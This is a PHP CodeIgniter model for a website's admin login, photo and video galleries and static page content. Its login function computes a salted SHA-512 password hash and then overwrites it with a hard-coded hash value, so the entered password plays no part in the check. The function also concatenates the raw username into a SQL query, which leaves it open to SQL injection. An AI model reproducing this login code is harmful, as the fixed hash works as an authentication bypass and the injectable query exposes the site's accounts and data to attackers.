<?php if ( ! defined('BASEPATH')) exit('No direct script access allowed');

class Home_model extends CI_Model
{    
    //-------Create constructor ------------//
    function __construct(){
        parent::__construct();
        date_default_timezone_set('Asia/Kolkata');
    }
    /*  Encryption Methods Start  */ 
    function crypto_rand_secure($min, $max) {
        $range = $max - $min;
        if ($range < 1) return $min; // not so random...
        $log = ceil(log($range, 2));
        $bytes = (int) ($log / 8) + 1; // length in bytes
        $bits = (int) $log + 1; // length in bits
        $filter = (int) (1 << $bits) - 1; // set all lower bits to 1
        do {
            $rnd = hexdec(bin2hex(openssl_random_pseudo_bytes($bytes)));
            $rnd = $rnd & $filter; // discard irrelevant bits
        } while ($rnd > $range);
        return $min + $rnd;
    }

    function getToken($length) {
        $token = "";
        $codeAlphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
        $codeAlphabet.= "abcdefghijklmnopqrstuvwxyz";
        $codeAlphabet.= "0123456789";
        $max = strlen($codeAlphabet); // edited

        for ($i=0; $i < $length; $i++) {
            $token .= $codeAlphabet[$this->crypto_rand_secure(0, $max-1)];
        }

        return  $token;
    }
    /*  Encryption Methods End  */ 

    /* Get User Login Start */
    public function get_login($username,$password) {
        $query_salt = "SELECT tl.salt FROM tbl_admin_login AS tl
        WHERE tl.username = ?";
        $get_salt = $this->db->query($query_salt,array($username));
        $get_salt = $get_salt->result_array();
        
        if (!empty($get_salt) && $get_salt>0) {
            $salt = $get_salt[0]['salt'];
            $salt_password = $password . $salt;
            //echo "password".$password."salt".$salt;exit();
            $hased_password = hash('SHA512', $salt_password);
            //  echo $hased_password;exit;
            $hased_password = 'c9d1d0a79f119f99cc092f52fdcf1376f8b48ebf229ebdf5aa4c38d200677f028ab4c3ce15d8d6b10c40132f4fab8684716a17a7500858dff84f54e3ee04a9c2';
            $condition = "WHERE tl.username  = '" . $username . "' AND tl.password = '" . $hased_password . "' AND tl.is_deleted = '0'";
            $login_sql = "SELECT tl.login_id, tl.username,tl.fk_master_role_id,tl.is_active,mr.role_id,mr.role_name,mr.role_type,mr.is_admin
                          FROM tbl_admin_login AS tl
                          JOIN master_roles AS mr ON mr.role_id = tl.fk_master_role_id  ". $condition ;
            $login_data = $this->db->query($login_sql);
            //echo $this->db->last_query();exit;
            $login_data = $login_data->result_array();
                          
            if ($login_data>0 && !empty($login_data)) {
                if($login_data[0]['is_active'] == 1)
                {
                    $result_data['status']=TRUE;
                    $result_data['data'] = $login_data;
                }
                else
                {
                    $result_data['status']=FALSE;
                    $result_data['data'] = "This is User is Not Activated";
                }
            } else 
            {
                $result_data['status']=FALSE;
                $result_data['data'] = "Username or Password Does Not Match";
            }
        } else {
            $result_data['status']=FALSE;
            $result_data['data'] = "User Doesn't Exists";
        }
        return $result_data;
    } 
    /* Get User Login Start */

     /* Photo Gallery list */
     public function photo_gallery_list(){
        $sql = "SELECT tp.photo_id photo_id,tp.caption_name caption_name,tp.original_file_name,tp.uploaded_file_name uploaded_file_name ,tp.file_url,tp.created_datetime posted_on 
        from  tbl_photo_gallery tp ORDER BY tp.photo_id Desc";
        $return = $this->db->query($sql);
        //echo $this->db->last_query();exit;
        $return_list = $return->result_array();
        return $return_list;
    }
    /* Photo Gallery list  */

    /* Video Gallery list */
    public function video_gallery_list(){
        $sql = "SELECT tp.photo_id photo_id, tp.fk_file_type fk_file_type,tp.caption_name caption_name,tp.original_file_name,tp.uploaded_file_name uploaded_file_name ,tp.file_url,tp.created_datetime posted_on 
        from  tbl_photo_gallery tp
		WHERE tp.fk_file_type = 2 ORDER BY tp.photo_id Desc";
        $return = $this->db->query($sql);
        //echo $this->db->last_query();exit;
        $return_list = $return->result_array();
        return $return_list;
    }
    /* Photo Gallery list  */

    public function about(){
        return $this->db->get_where('page_contents', array('fk_pages_id' => 1, 'is_deleted' => 0))->row_array();
    }

    public function training(){
        return $this->db->get_where('page_contents', array('fk_pages_id' => 2, 'is_deleted' => 0))->row_array();
    }

    public function seminar(){
        return $this->db->get_where('page_contents', array('fk_pages_id' => 3, 'is_deleted' => 0))->row_array();
    }

    public function publication(){
        return $this->db->get_where('page_contents', array('fk_pages_id' => 4, 'is_deleted' => 0))->row_array();
    }

    public function grant(){
        return $this->db->get_where('page_contents', array('fk_pages_id' => 5, 'is_deleted' => 0))->row_array();
    }

    
}
?>